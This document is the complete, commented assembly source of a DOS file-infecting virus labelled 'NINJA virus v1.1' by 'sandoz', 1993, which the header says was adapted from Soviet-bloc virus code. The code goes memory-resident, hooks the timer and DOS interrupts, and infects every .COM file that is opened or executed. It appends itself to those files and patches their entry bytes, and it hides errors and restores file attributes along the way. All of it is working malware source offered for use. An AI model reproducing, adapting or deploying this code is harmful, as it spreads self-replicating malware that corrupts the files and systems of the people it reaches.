;NINJA virus v1.1 _sandoz_

;I dont believe that NINJA scans, it was developed from Soviet block virus
;code that was aquired late in 1988. For this reason some features are missing
;such as original encryption, which really wont be missed. However some features 
;are rather unique. used were System Violator's Virus Mutator and some luck.
;an oldie but interesting.

cseg		segment

		assume	cs:cseg, ds:cseg, es:cseg, ss:cseg
		org	100h

l_0100:	mov	bx,offset l_0146				;0100.BB 0146
	jmp	bx			;Register jump		;0103 FF E3

;-------victim code----------------------------------------------
;		...
		org	0146h

;=======virus code begin=========================================
;	in resident virus this code begins at 9000h:0A000h
;----------------------------------------------------------------
l_0146:	push	ds			;<- Entry into virus	;0146 1E
	push	es						;0147 06
	push	ax						;0148 50
NOP
	push	ds			;<-victim code restore	;0149 1E
	pop	es						;014A 07

	mov	si,bx			;offset wejscia w wirusa;014B 8B F3
	add	si,02D3h		;(419)changed code saved;014D.81 C6 02D3
	mov	di,0100h		;changed code address	;0151.BF 0100
	mov	cx,5			;length of change	;0154 B9 0005
	rep	movsb						;0157 F3/ A4
	push	ds						;0159 1E

	xor	ax,ax			;<- get int 8		;015A 31 C0
	push	ax						;015C 50

	pop	ds						;015D 1F
	mov	si,20h			;int 8h			;015E.BE 0020
	mov	di,bx						;0161 8B FB
	add	di,0E6h			;(022Ch)=old int 8	;0163.81 C7 00E6
	mov	cx,4						;0167 B9 0004
	rep	movsb						;016A F3/ A4
	mov	ax,bx						;016C 8B C3
	add	ax,57h			;(019Dh)=continuat. adr.;016E 05 0057
	call	s_0193						;0171 E8 001F

	pop	ds						;0174 1F
l_0175:	jmp	short l_0175		;int 8 waiting loop	;0175 EB FE

;<----- return after int 8 service-------------------------------
l_0177:	cli				;<- int 8 vector restore;0177 FA
	xor	ax,ax						;0178 31 C0
	mov	es,ax						;017A 8E C0
	mov	di,0020h					;017C.BF 20 00
	mov	si,bx						;017F 8B F3

	add	si,0E9h			;(022Ch)		;0181.81 C6 E6 00
	mov	cx,4						;0185 B9 04 00
	repz	movsb						;0188 F3 / A4
	sti							;018A FB
NOP
	pop	ax			;<- run victim programm	;018B 58
	pop	es						;018C 07
	pop	ds						;018D 1F
	mov	bx,0100h		;execution begin address;018E.BB 00 01

	jmp	bx						;0191 FF E3


;<----- "get int 8" routine -------------------------------------
s_0193	proc	near
	cli				; Disable interrupts	;0193 FA
	mov	ds:[20h],ax					;0194 A3 0020
	mov	ds:[22h],es					;0197 8C 06 0022
	sti				; Enable interrupts	;019B FB

	retn							;019C C3
s_0193	endp

;<----- code executed after interrupt int 8----------------------
l_019D:	pushf							;019D 9C
	push	ax						;019E  50
	push	bx						;019F  53
	push	cx						;01A0  51
	push	dx						;01A1  52

	push	si						;01A2  56
	push	di						;01A3  57
	push	es						;01A4  06
	push	ds						;01A5  1E
	push	bp						;01A6  55

	mov	bp,sp						;01A7  8B EC
	mov	ax,bx			;base to virus code	;01A9  8B C3
	add	ax,2Fh			;(175h)			;01AB  05 002F

	cmp	ss:[bp+14h],ax		;interrupted code CS seg;01AE  36 39 46 14
	jnz	l_0220			;-> we must wait again	;01B2  75 6C

l_01B4:	add     word ptr ss:[BP+14],3	;chng ret addr to l_0177;01B4  36 83 46 14 03

					;<- restore int 8 vector
	push    ds						;02B9  1E
	xor     ax,ax						;01BA  31 C0
	push    ax						;01BC  50

	POP     DS						;01BD  1F
	CLI							;01BE  FA
	MOV     AX,cs:[BX+00E6h]	;(022Ch) old int 8 vect	;01BF  2E 8B 87 E6 00
	MOV     ds:[20h],AX					;01C4  A3 20 00
	MOV     AX,cs:[BX+00E8h]				;01C7  2E 8B 87 E8 00
	MOV     ds:[22h],AX					;01CC  A3 22 00
	POP     DS						;01CF  1F

	MOV     AX,9000h		;memory last 64KB	;01D0  B8 00 90

	MOV     ES,AX						;01D3  8E C0
	MOV     SI,BX			;virus code begin	;01D5  8B F3
	MOV     DI,0A000h		;the last 24KB of mem	;01D7  BF 00 A0
	MOV     AL,es:[DI]					;01DA  26 8A 05
	CMP     AL,1Eh			;allready installed ?	;01DD  3C 1E
	JZ      l_0220			;-> yes, end of job	;01DF  74 3F
	MOV     CX,02FBh		;virus code length	;01E1  B9 FB 02
	REPZ	MOVSB			;copy virus code	;01E4  F3 / A4
					;<- Make link to DOS

	CALL    s_0230			;first DOS version	;01E6  E8 47 00
	JZ      l_0220			;-> O.K.		;01E9  74 35
	CALL    s_027D			;Second DOS version	;01EB  E8 8F 00
	JZ      l_0220			;-> O.K.		;01EE  74 30
	CALL    s_02CA			;third DOS version	;01F0  E8 D7 00
	JZ      l_0220			;-> O.K.		;01F3  74 2B

					;<- Unknown DOS version, BRUTE installation
	MOV     AX,9000h					;01F5  B8 00 90

	PUSH    AX						;01F8  50
	POP     ES						;01F9  07
	XOR     AX,AX						;01FA  31 C0
	PUSH    AX						;01FC  50
	POP     DS						;01FD  1F
	MOV     AX,ds:[84h]					;01FE  A1 84 00
	MOV     es:[0A1DFh],AX		;(0325)			;0201  26 A3 DF A1
	MOV     es:[0A2CEh],AX		;(0414)			;0205  26 A3 CE A2
	MOV     AX,ds:[86h]					;0209  A1 86 00

	MOV     es:[0A1E1h],AX		;(0327)			;020C  26 A3 E1 A1
	MOV     es:[0A2D0h],AX		;(0416)			;0210  26 A3 D0 A2
	MOV     AX,0A1D1h		;(0317) new int 21h hndl;0214  B8 D1 A1
	MOV     ds:[84h],AX		;int 21h		;0217  A3 84 00
	MOV     AX,9000h		;resident virus segment	;021A  B8 00 90
	MOV     ds:[86h],AX					;021D  A3 86 00
		
l_0220:	pop	bp						;0220  5D
	pop	ds						;0221  1F

	pop	es						;0221  07
	pop	di						;0222  5F
	pop	si						;0223  5E
	pop	dx						;0224  5A
	pop	cx						;0226  59
	pop	bx						;0227  5B
	pop	ax						;0228  58
	popf							;0229  9D
	sti							;022A  FB

	db	0EAh						;022B  EA
r_00E6	db	0ABh,00h,0C2h,0Bh				;022C  AB 00 C2 0B
;	jmp	0BC2:00AB		;-> oryginal int 8


;================================================================
;	Make link to DOS - first DOS version
;----------------------------------------------------------------
s_0230:	PUSH    DS						;0230  1E

	PUSH    ES						;0231  06
	XOR     AX,AX			;<- check possibility	;0232  31 C0
	PUSH    AX						;0234  50
	POP     DS						;0235  1F
	MOV     AX,ds:[86h]		;oryginal int 21h seg	;0236  A1 86 00
	PUSH    AX						;0239  50
	POP     DS						;023A  1F
	MOV     BX,0100h					;023B  BB 00 01
	CMP     BYTE PTR [BX],0E9h				;023E  80 3F E9

	JNZ     l_027A			;-> unknown system	;0241  75 37
	INC     BX						;0243  43
	CMP     BYTE PTR [BX],53h				;0244  80 3F 53
	JNZ     l_027A			;-> unknown system	;0247  75 31
	INC     BX						;0249  43
	CMP     BYTE PTR [BX],22h				;024A  80 3F 22
	JNZ     l_027A			;-> unknown system	;024D  75 2B

					;<- make link to DOS

	MOV     AX,9000h					;024F  B8 00 90
	MOV     ES,AX						;0252  8E C0

	MOV     SI,1223h					;0254  BE 23 12
	MOV     DI,0A2CEh		;(0414)			;0257  BF CE A2
	MOV     CX,4						;025A  B9 04 00
	REPZ    MOVSB						;025D  F3 / A4

	MOV     SI,1223h					;025F  BE 23 12

	MOV     DI,0A1DFh		;(0325)			;0262  BF DF A1
	MOV     CX,4						;0265  B9 04 00
	REPZ    MOVSB						;0268  F3 / A4

	MOV     AX,0A1D1h		;(0317)=new int 21h hndl;026A  B8 D1 A1
	MOV     ds:[1223h],AX					;026D  A3 23 12
	MOV     AX,9000h					;0270  B8 00 90
	MOV     ds:[1225h],AX					;0273  A3 25 12


	XOR     AX,AX						;0276  31 C0
	CMP     AL,AH						;0278  38 E0

l_027A:	pop	es						;027A  07
	pop	ds						;027B  1F
	retn							;027C  C3

;================================================================
;	Make link to DOS - second DOS version

;----------------------------------------------------------------
s_027D:	push	ds						;027D  1E
	push	es						;027E  06
	xor	ax,ax			;<- check possibility	;027F  31 C0
	push	ax						;0281  50
	pop	ds						;0282  1F
	mov	ax,ds:[86h]		;oryginal int 21h seg	;0283  A1 0086
	push	ax						;0286  50
	pop	ds						;0287  1F

	mov	bx,0100h					;0288 .BB 0100
	cmp	byte ptr [bx],0E9h				;028B  80 3F E9
	jne	l_02C7			;-> unknown system	;028E  75 37
	inc	bx						;0290  43
	cmp	byte ptr [bx],0CAh				;0291  80 3F CA
	jne	l_02C7			;-> unknown system	;0294  75 31
	inc	bx						;0296  43
	cmp	byte ptr [bx],13h				;0297  80 3F 13
	jne	l_02C7			;-> unknown system	;029A  75 2B


					;<- make link to DOS
	mov	ax,9000h					;029C  B8 9000
	mov	es,ax						;029F  8E C0
	mov	si,011Dh					;02A1 .BE 011D
	mov	di,0A2CEh		;(0414)			;02A4 .BF A2CE
	mov	cx,4						;02A7  B9 0004
	rep	movsb						;02AA  F3/ A4
	mov	si,011Dh					;02AC .BE 011D

	mov	di,0A1DFh		;(0325)			;02AF .BF A1DF
	mov	cx,4						;02B2  B9 0004
	rep	movsb						;02B5  F3/ A4

	mov	ax,0A1D1h		;(0317)=new int 21h hndl;02B7  B8 A1D1
	mov	ds:[011Dh],ax					;02BA  A3 011D
	mov	ax,9000h					;02BD  B8 9000
	mov	ds:[011Fh],ax					;02C0  A3 011F


	xor	ax,ax						;02C3  31 C0
	cmp	al,ah						;02C5  38 E0

l_02C7:	pop	es						;02C7  07
	pop	ds						;02C8  1F
	retn							;02C9  C3

;===============================================================
;	Make link to DOS - third DOS version

;---------------------------------------------------------------
s_02CA:	push	ds						;02CA  1E
	push	es						;02CB  06
	xor	ax,ax			;<- check possibility	;02CC  31 C0
	push	ax						;02CE  50
	pop	ds						;02CF  1F
	mov	ax,ds:[86h]		;oryginal int 21h seg	;02D0  A1 0086
	push	ax						;02D3  50
	pop	ds						;02D4  1F

	mov	bx,100h						;02D5 .BB 0100
	cmp	byte ptr [bx],0E9h				;02D8  80 3F E9
	jne	l_0314			;-> unknown system	;02DB  75 37
	inc	bx						;02DD  43
	cmp	byte ptr [bx],15h				;02DE  80 3F 15
	jne	l_0314			;-> unknown system	;02E1  75 31
	inc	bx						;02E3  43
	cmp	byte ptr [bx],5					;02E4  80 3F 05
	jne	l_0314			;-> unknown system	;02E7  75 2B


					;<- make link to DOS
	mov	ax,9000h					;02E9  B8 9000
	mov	es,ax						;02EC  8E C0

	mov	si,0040Fh					;02EE .BE 040F
	mov	di,0A2CEh		;(0414)			;02F1 .BF A2CE
	mov	cx,4						;02F4  B9 0004
	rep	movsb						;02F7  F3/ A4


	mov	si,0040Fh					;02F9 .BE 040F
	mov	di,0A1DFh		;(0325)			;02FC .BF A1DF
	mov	cx,4						;02FF  B9 0004
	rep	movsb						;0302  F3/ A4

	mov	ax,0A1D1h		;(0317)=new int 21h hndl;0304  B8 A1D1
	mov	ds:[040Fh],ax					;0307  A3 040F
	mov	ax,9000h					;030A  B8 9000

	mov	ds:[0411h],ax					;030D  A3 0411

	xor	ax,ax						;0310  31 C0
	cmp	al,ah						;0312  38 E0

l_0314:	pop	es						;0314  07
	pop	ds						;0315  1F
	retn							;0316  C3


;==========================================================================
;		New int 21h handling subroutine
;--------------------------------------------------------------------------
T_A1D1:	cmp	ah,3Dh			;open file ?		;0317  80 FC 3D
	je	l_0321			;-> Yes			;031A  74 05
	cmp	ah,4Bh			;load&execute/load ovl ?;031C  80 FC 4B
	jne	l_0324			;-> No			;031F  75 03
l_0321:	call	s_0329			;-> infect file		;0321  E8 0005


l_0324:	db	0EAh			;<- oryginal int 21h	;0324 EA
d_A1DF	dw	1460h,0273h		;old int 21h		;0325 60 14 73 02
;	jmp	far ptr 0273:1460

;==========================================================================
;		Infecting subroutine
;--------------------------------------------------------------------------
s_0329	proc	near
	push	ax						;0329  50

	push	bx						;032A  53
	push	cx						;032B  51
	push	dx						;032C  52
	push	ds						;032D  1E
	push	di						;032E  57
	push	si						;032F  56
	push	es						;0330  06
	push	ds						;0331  1E
	push	es						;0332  06

NOP
	xor	ax,ax			;<- get int 24h		;0333  31 C0
	push	ax						;0335  50
	pop	ds						;0336  1F
	push	cs						;0337  0E
	pop	es						;0338  07
	mov	si,90h			;int 24h vector		;0339 .BE 0090
	mov	di,0A2E0h		;(0426)-old vector safes;033C .BF A2E0
	mov	cx,4			;double word		;033F  B9 0004

	rep	movsb						;0342  F3/ A4
	mov	ax,0A2C9h		;(040F)=new int 24h	;0344  B8 A2C9
	mov	ds:[90h],ax					;0347  A3 0090
	mov	ds:[92h],cs					;034A  8C 0E 0092
NOP
	pop	es						;034E  07
	pop	ds						;034F  1F
	mov	di,dx			;file path		;0350  8B FA
	push	ds						;0352  1E

	pop	es						;0353  07
	mov	cx,40h			;find dot		;0354  B9 0040
	mov	al,2Eh						;0357  B0 2E
	repne	scasb						;0359  F2/ AE
	cmp	cx,0						;035B  83 F9 00
	jne	l_0363						;035E  75 03
	jmp	l_0406			;-> no file extension	;0360  E9 00A3

l_0363:	push	cs						;0363  0E

	pop	es						;0364  07
	mov	si,di						;0365  8B F7
	mov	di,0A2DDh		;(0423)='COM'		;0367 .BF A2DD
	mov	cx,3						;036A  B9 0003
	repe	cmpsb						;036D  F3/ A6
	cmp	cx,0						;036F  83 F9 00
	je	l_0377						;0372  74 03
	jmp	l_0406			;-> it isn't *.COM	;0374  E9 008F


					;<- *.COM file infection
l_0377:	mov	ax,4300h		;Get file attributes	;0377  B8 4300
	call	s_0412			;int 21h call		;037A  E8 0095
	mov	ds:[0A2E4h],cx		;(042A)			;037D  89 0E A2E4

	and	cx,0FFFEh		;no R/O			;0381  81 E1 FFFE
	mov	ax,4301h		;Set file attributes	;0385  B8 4301
	call	s_0412			;int 21h call		;0388  E8 0087


	mov	ah,3Dh			;Open File		;038B  B4 3D
	mov	al,2			;R/W access		;038D  B0 02
	call	s_0412			;int 21h call		;038F  E8 0080
	jc	l_0406			;-> Opening Error	;0392  72 72
	push	cs						;0394  0E
	pop	ds						;0395  1F
	mov	bx,ax			;file handle		;0396  8B D8
	mov	dx,0A2D3h		;(0419)	= file buffer	;0398  BA A2D3
	mov	cx,5			;bytes count		;039B  B9 0005

	mov	ah,3Fh			;read file		;039E  B4 3F
	call	s_0412			;int 21h call		;03A0  E8 006F

	mov	ah,0BBh			;allready infected ?	;03A3  B4 BB
	cmp	ah,ds:[0A2D3h]		;(0419)			;03A5  3A 26 A2D3
	je	l_03E2			;-> yes, close file	;03A9  74 37
	xor	cx,cx						;03AB  31 C9
	xor	dx,dx						;03AD  31 D2
	mov	ah,42h			;Move file ptr		;03AF  B4 42

	mov	al,2			;EOF + offset		;03B1  B0 02
	call	s_0412			;int 21h call		;03B3  E8 005C

	cmp	ax,0FA00h		;file size =<64000	;03B6  3D FA00
	ja	l_03E2			;->  above, close file	;03B9  77 27
	add	ax,100h			;PSP length		;03BB  05 0100
	mov	ds:[0A2D9h],ax		;(041F)	- vir.begin addr;03BE  A3 A2D9
	mov	ah,40h			;Write file		;03C1  B4 40
	mov	dx,0A000h		;address of buffer	;03C3  BA A000

	mov	cx,2FBh			;bytes count		;03C6  B9 02FB
	call	s_0412			;int 21h call		;03C9  E8 0046

	xor	cx,cx						;03CC  31 C9
	xor	dx,dx						;03CE  31 D2
	mov	ah,42h			;Move file ptr		;03D0  B4 42
	mov	al,0			;BOF + offset		;03D2  B0 00
	call	s_0412			;int 21h call		;03D4  E8 003B


	mov	ah,40h			;Write file		;03D7  B4 40
	mov	dx,0A2D8h		;(041E)=BOF virus code	;03D9  BA A2D8
	mov	cx,5			;code length		;03DC  B9 0005
	call	s_0412			;int 21h call		;03DF  E8 0030

l_03E2:	mov	ah,3Eh			;close file		;03E2  B4 3E
	call	s_0412			;int 21h call		;03E4  E8 002B

	mov	cx,ds:[0A2E4h]		;(042A) - old atribute	;03E7  8B 0E A2E4

	mov	ax,4301h		;set file attributes	;03EB  B8 4301
	call	s_0412			;int 21h call		;03EE  E8 0021
	push	ds						;03F1  1E
	push	es								;03F2  06

	xor	ax,ax			;restore int 24h vector	;03F3  31 C0
	push	ax						;03F5  50
	pop	es						;03F6  07
	push	cs						;03F7  0E

	pop	ds						;03F8  1F
	mov	di,90h			;int 24h vector		;03F9 .BF 0090
	mov	si,0A2E0h		;(0426)	- old int 24h	;03FC .BE A2E0
	mov	cx,4			;double word		;03FF  B9 0004
	rep	movsb						;0402  F3/ A4
	pop	es						;0404  07
	pop	ds						;0405  1F
l_0406:	pop	es			;<- EXIT		;0406  07
	pop	si						;0407  5E

	pop	di						;0408  5F
	pop	ds						;0409  1F
	pop	dx						;040A  5A
	pop	cx						;040B  59
	pop	bx						;040C  5B
	pop	ax						;040D  58
	retn							;040E  C3
s_0329	endp


;================================================================
;	int 24h handling routine (only infection time)
;----------------------------------------------------------------
T_A2C9:	mov	al,0		;ignore	critical error		;040F  B0 00
	iret							;0411  CF

;================================================================
;	hidden int 21h call
;----------------------------------------------------------------

s_0412	proc	near
	pushf							;0412 9C
	db	9Ah						;0413 9A
d_A2CE	dw	1460h,0273h		;old int 21h		;0414 60 14 73 02
	;call	far ptr 0273:1460
	retn							;0418  C3
s_0412	endp

;<----- oryginal BOF code
d_A2D3	db	31h,0Dh,0Ah,32h,0Dh			;0419  31 0D 0A 32 0D

;<----- wirus BOF code
d_A2D8	db	0BBh					;041E BB
d_A2D9	dw	0146h		;virus begin address	;041F 46 01
	dw	0E3FFh					;0421 FF E3

;<----- work bytes
d_A2DD	db	'COM'		;file extension pattern	;0423 43 4F 4D
d_A2E0	dw	0556h,1232h	;old int 24h vector	;0426 56 05 32 12
d_A2E4	dw	0		;file attributes	;042A 00 00

;<----- just my way of sayin' howdy
        db      '-=NINJA=- <sandoz 1993>'                 ;042C 50 43 2D 46 4C 55
							;     20 62 79 20 57 49
							;     5A 41 52 44 20 31
							;     39 39 31
cseg	ends		

	end	l_0100
